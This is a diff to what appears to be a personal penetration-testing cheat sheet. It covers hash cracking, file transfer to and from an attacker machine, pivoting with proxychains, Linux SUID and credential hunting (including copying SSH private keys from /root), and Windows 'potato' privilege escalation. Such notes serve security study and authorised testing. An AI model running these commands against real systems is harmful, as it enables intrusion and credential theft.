@@ -181,7 +181,7 @@ Supported services:
   hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
   ```
 
-- zip files: johnthe ripper, use zip2john to convert it
+- Files: johnthe ripper, use zip2john to convert it
   - `zip2john backup.zip > backup.hash`
   - `john backup.hash`
 
@@ -434,7 +434,7 @@ Here some way to deal with them:
 
 - `ftp [IP] -P [PORT]`
 
-  - `cd`, `ls`, to navigate
+  - `cd`, `ls -la` , to navigate
   - `get` `put` to download/upload
   - `status` to check the settings
   - `LIST -R`, if the setting ls_recurse_enable=YES, this show all the content at once.
@@ -509,14 +509,18 @@ Here some way to deal with them:
 
   - Public-key authentication
 
-    The private key is stored on the user's own computer and secured with a passphrase. Public keys are also stored on the server., and can be decrypted with the private key.
+    The private key is stored on the user's own computer and secured with a passphrase. 
+
+    PUTTY is Windows format, that can be converted in Linux with:
+
+    `puttygen ssh_key_file -O private-openssh -o id_rsa`
 
   - Host-based authentication
 
   - Keyboard authentication
-
+  
   - Challenge-response authentication
-
+  
   - GSSAPI authentication
 
 #### Configuration
@@ -2978,7 +2982,7 @@ echo -n [STRING] | base64 -d > [FILE_NAME]
    netstat -lnpt
    ```
 
-4. Download
+4. Download on your machine
 
    ```bash
    scp user@remotehost:[FILE_PATH]
@@ -2987,7 +2991,7 @@ echo -n [STRING] | base64 -d > [FILE_NAME]
 To upload:
 
 ```bash
-scp [FILE] user@targethost:[OUTPUT LOCATION
+scp [FILE] user@targethost:[OUTPUT LOCATION]
 ```
 
 ### Shells & Payloads
@@ -3131,7 +3135,7 @@ If you have a winRM shell, you can simply use the commands `upload` and `downloa
    If you need credentials:
 
    ```cmd
-   net use n: \\[YOUR IP]\share /user:USER PASS
+   net use n: \\[YOUR IP]\share /user:hacker password
    copy n:\[FILE]
    ```
 
@@ -3939,7 +3943,7 @@ Access private subnetworks of the target. Forwards all the service of the privat
   2. Add the port of `proxychains` in `/etc/proxychains4.conf`
 
      ```bash
-     [PROXY] 127.0.0.1 9050	
+     [PROXY] 127.0.0.1 9999
      ```
 
   3. SShuttle allows to perform pivoting similar to ligolo, without proxychains
@@ -4102,7 +4106,11 @@ Forward a local service to a remote port. Usually used to gain shells or exchang
 
 ## Linux
 
-### Users
+### Fundamentals
+
+- Execute bash script: `chmod +x [FILE]` &rarr; `./[FILE]`
+
+### Users & Privileges
 
 - Users `cat /etc/passwd | grep sh` and `ls  /home`
 - User Group:
@@ -4110,9 +4118,7 @@ Forward a local service to a remote port. Usually used to gain shells or exchang
   -  `id` and what can that group do
   -  [interesting_groups](https://hacktricks.boitatech.com.br/linux-unix/privilege-escalation/interesting-groups-linux-pe)
 
-### Privileges
-
-Search on [gtfobins](https://gtfobins.github.io) bin files with relative privileges
+- Search on [gtfobins](https://gtfobins.github.io) bin files with relative privileges
 
 ##### SUDO
 
@@ -4169,6 +4175,27 @@ sudo -u [USER] [COMMAND] 	# Execute an application as an user
 - `find / -perm -u=s -type f 2>/dev/null`
 - Non-Default / [SUID3ENUM](https://github.com/Anon-Exploiter/SUID3NUM) Tool / GTFOBin
 
+Default SUID (not interesting):
+
+```
+/bin/ping
+/bin/mount
+/bin/umount
+/bin/su
+/sbin/mount.nfs
+/usr/bin/chage
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/bin/at
+/usr/bin/crontab
+/usr/bin/newgrp
+/usr/sbin/exim4
+/usr/sbin/pppd
+```
+
 ### Credential Hunting
 
 - Some files worth checking:
@@ -4214,7 +4241,7 @@ sudo -u [USER] [COMMAND] 	# Execute an application as an user
 
   - `find / -type f -readable 2>/dev/null`
 
-  - `/proc` and `sys` `run` not interesting
+  - Add`| grep -v -E "proc|sys|run"`
 
 - Cronjobs:
 
@@ -4227,7 +4254,12 @@ sudo -u [USER] [COMMAND] 	# Execute an application as an user
 
 - SSH keys:  
 
+  - Check if there is a private key: `/home/user/.ssh/authorized_keys`
+    - `id_rsa`
+    - `id_ed25519`
+  
   - Read: copy it from `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`
+  
 
 
   ```bash
@@ -4306,10 +4338,17 @@ cmd /c "<CMD Command>"		# Execute CMD command
 
 You must be a **Service Account:** `SQL / IIS / NETWORK / LOCAL`
 
-Get the [CLSID](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise)
+Get the [CLSID](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise):
+
+1. Download and transfer CLSID.list
+2. Transfer `~/TOOLS/PRIVESC_WINDOWS/clsid.bat`
+3. Run in PS `Start-Process clsid.bat`
+4. Get one of the `AUTHORITY\SYSTEM` 
+
+Potatoes:
 
 - Churrasco - Server 2003
-- JuicyPotato - Server 2008 - 2016 - Win 10 < 1803
+- [JuicyPotato](https://github.com/k4sth4/Juicy-Potato/tree/main) - Server 2008 - 2016 - Win 10 < 1803
 - GodPotato - Server 2012 - 2022
 - PrintSpoofer - Windows 10 / Server 2016 - 2019
 - [GenericPotato](https://github.com/micahvandeusen/GenericPotato) - Windows 7 - 10 / Server < 2019
